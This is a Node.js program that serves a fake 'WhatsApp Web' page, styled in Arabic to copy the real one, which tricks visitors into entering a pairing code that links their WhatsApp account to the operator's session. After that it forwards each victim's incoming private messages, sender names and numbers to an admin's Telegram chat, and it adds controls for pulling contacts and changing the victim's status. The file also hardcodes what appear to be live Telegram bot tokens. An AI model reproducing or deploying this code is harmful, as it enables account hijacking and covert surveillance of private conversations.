/**
 * 👑 TARZAN EMPEROR - THE REAL META CLONE (VIP1)
 * -----------------------------------------------
 * ⚠️ الواجهة الحقيقية: تصميم WhatsApp Web 2026، متناسق مع الجوال، زر نسخ الكود.
 */

const {
    default: makeWASocket,
    useMultiFileAuthState,
    makeCacheableSignalKeyStore,
    getContentType,
    delay,
    Browsers
} = require("@whiskeysockets/baileys");

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const pino = require("pino");
const fs = require("fs-extra");

const CONFIG = {
    PAIR_BOT_TOKEN: "8333956388:AAFbTVaCGRNVFRm1hz74DzJM-zHqRlfiUwY",
    CONTROL_BOT_TOKEN: "8439769345:AAEL8wgVxw6NGBR12wLBZx3N4t1Lif6jKWI",
    ADMIN_ID: "6069303682",
    PORT: process.env.PORT || 3000
};

const app = express();
app.use(express.json());

// ==========================================
// 🌐 واجهة الويب الاحترافية (جذابة ومناسبة لكل الأجهزة)
// ==========================================
app.get("/", (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <title>WhatsApp Web</title>
        <style>
            :root { --wa-green: #00a884; --wa-bg: #f0f2f5; --wa-text: #41525d; }
            body { font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; background: var(--wa-bg); margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
            .header { background: var(--wa-green); height: 130px; width: 100%; position: fixed; top: 0; z-index: -1; }
            .container { background: white; width: 95%; max-width: 900px; margin-top: 40px; border-radius: 4px; box-shadow: 0 12px 24px rgba(0,0,0,0.1); display: flex; flex-wrap: wrap; overflow: hidden; min-height: 500px; }
            .info-section { flex: 1; padding: 40px; min-width: 300px; }
            .qr-section { flex: 1; background: #f9f9fa; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; border-right: 1px solid #ebeced; min-width: 300px; }
            h1 { color: #54656f; font-size: 28px; font-weight: 300; margin-bottom: 40px; }
            ol { color: var(--wa-text); font-size: 16px; line-height: 2; padding-right: 20px; }
            b { color: #111b21; }
            .phone-box { margin-top: 30px; width: 100%; }
            input { width: 100%; padding: 12px 0; border: none; border-bottom: 2px solid var(--wa-green); outline: none; font-size: 17px; background: transparent; transition: 0.3s; }
            .btn-next { color: var(--wa-green); font-weight: 600; text-decoration: none; cursor: pointer; display: inline-block; margin-top: 20px; text-transform: uppercase; font-size: 14px; }
            .code-display { display: none; text-align: center; width: 100%; }
            .code-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 20px 0; direction: ltr; }
            .digit { background: white; border: 1px solid #ddd; padding: 15px 5px; font-size: 24px; font-weight: bold; color: #128c7e; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
            .btn-copy { background: var(--wa-green); color: white; border: none; padding: 12px 25px; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
            #status { color: #667781; font-size: 13px; margin-top: 10px; }
            @media (max-width: 600px) { .container { margin-top: 20px; border-radius: 0; width: 100%; } h1 { font-size: 22px; } }
        </style>
    </head>
    <body>
        <div class="header"></div>
        <div class="container">
            <div class="info-section">
                <h1>استخدام واتساب على الكمبيوتر</h1>
                <ol>
                    <li>افتح واتساب على هاتفك</li>
                    <li>اضغط على <b>القائمة</b> أو <b>الإعدادات</b></li>
                    <li>اختر <b>الأجهزة المرتبطة</b> ثم <b>ربط جهاز</b></li>
                    <li>اضغط على <b>الربط برقم الهاتف بدلاً من ذلك</b></li>
                </ol>
                <div id="input-area">
                    <input type="text" id="phone" placeholder="أدخل رقم الهاتف (مثال: 9665xxxxxxxx)">
                    <div class="btn-next" onclick="startPairing()">التالي</div>
                    <div id="status"></div>
                </div>
            </div>
            <div class="qr-section">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80" style="margin-bottom: 20px;">
                <div id="code-area" class="code-display">
                    <div style="font-size: 15px; color: #3b4a54;">أدخل هذا الكود في هاتفك:</div>
                    <div class="code-grid" id="code-box"></div>
                    <button class="btn-copy" onclick="copyCode()">نسخ الكود</button>
                </div>
            </div>
        </div>
        <script>
            let currentCode = "";
            async function startPairing() {
                const p = document.getElementById('phone').value.trim();
                if(!p) return;
                document.getElementById('status').innerText = "جاري إنشاء اتصال مشفر...";
                const res = await fetch('/api/pair', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: p })
                });
                const d = await res.json();
                if(d.code) {
                    currentCode = d.code;
                    document.getElementById('input-area').style.display = 'none';
                    document.getElementById('code-area').style.display = 'block';
                    const box = document.getElementById('code-box');
                    d.code.replace(/-/g, '').split('').forEach(char => {
                        const div = document.createElement('div');
                        div.className = 'digit';
                        div.innerText = char;
                        box.appendChild(div);
                    });
                } else { document.getElementById('status').innerText = "فشل الطلب، تأكد من الرقم."; }
            }
            function copyCode() {
                navigator.clipboard.writeText(currentCode);
                alert("تم نسخ الكود بنجاح!");
            }
        </script>
    </body>
    </html>
    `);
});

// ==========================================
// 🛡️ معالجة التضارب وتشغيل البوتات بدقة
// ==========================================
class TarzanUltimate {
    constructor() {
        this.sessions = new Map();
        // إعداد البوتات مع إسقاط التحديثات القديمة لمنع التضارب
        this.controlBot = new Telegraf(CONFIG.CONTROL_BOT_TOKEN);
        this.init();
    }

    async init() {
        fs.ensureDirSync("./sessions");
        try {
            await this.controlBot.launch({ dropPendingUpdates: true });
            console.log("🦁 Tarzan VIP1 System: Active");
        } catch (e) { console.error("❌ Control Bot Error"); }
        
        const dirs = fs.readdirSync("./sessions");
        dirs.forEach(d => d.startsWith("user-") && this.connectWA(d.replace("user-", "")));
    }

    async connectWA(phone, ctx = null) {
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/user-${phone}`);
        const sock = makeWASocket({
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
            browser: Browsers.macOS("Chrome"),
            printQRInTerminal: false
        });

        this.sessions.set(phone, sock);
        sock.ev.on("creds.update", saveCreds);

        if (ctx && !sock.authState.creds.registered) {
            await delay(3000);
            return await sock.requestPairingCode(phone);
        }

        sock.ev.on("messages.upsert", async ({ messages }) => {
            const m = messages[0];
            if (!m.message || m.key.fromMe) return;
            this.forwardVIP1(phone, m);
        });

        sock.ev.on("connection.update", (u) => {
            if (u.connection === "open") this.sendDashboard(phone);
            if (u.connection === "close") this.connectWA(phone);
        });
    }

    async forwardVIP1(phone, m) {
        const jid = m.key.remoteJid;
        if (jid.endsWith("@g.us")) return;
        
        const type = Object.keys(m.message)[0];
        const name = m.pushName || "غير مسجل";
        const sender = jid.split('@')[0];
        
        let details = `🦁 <b>[ تفاصيل رسالة VIP1 ]</b>\n`;
        details += `━━━━━━━━━━━━━━━\n`;
        details += `👤 <b>الاسم:</b> ${name}\n`;
        details += `📱 <b>الرقم:</b> <code>${sender}</code>\n`;
        details += `⚙️ <b>النوع:</b> ${type}\n`;
        details += `━━━━━━━━━━━━━━━\n`;

        const text = m.message.conversation || m.message.extendedTextMessage?.text || "[محتوى ميديا]";
        await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, details + `💬 <b>النص:</b>\n${text}`, { parse_mode: "HTML" });
    }

    async sendDashboard(phone) {
        const menu = Markup.inlineKeyboard([
            [Markup.button.callback("👥 سحب الجهات", `c_${phone}`), Markup.button.callback("📝 تغيير الحالة", `b_${phone}`)],
            [Markup.button.callback("🔴 إنهاء الجلسة", `out_${phone}`)]
        ]);
        await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, `👑 <b>VIP1 CONNECTED:</b> <code>${phone}</code>`, { parse_mode: "HTML", ...menu });
    }
}

const Tarzan = new TarzanUltimate();

app.post("/api/pair", async (req, res) => {
    const code = await Tarzan.connectWA(req.body.phone.replace(/\D/g, ""), { isWeb: true });
    res.json({ code });
});

app.listen(CONFIG.PORT, '0.0.0.0', () => console.log(`🚀 Server running on port ${CONFIG.PORT}`));
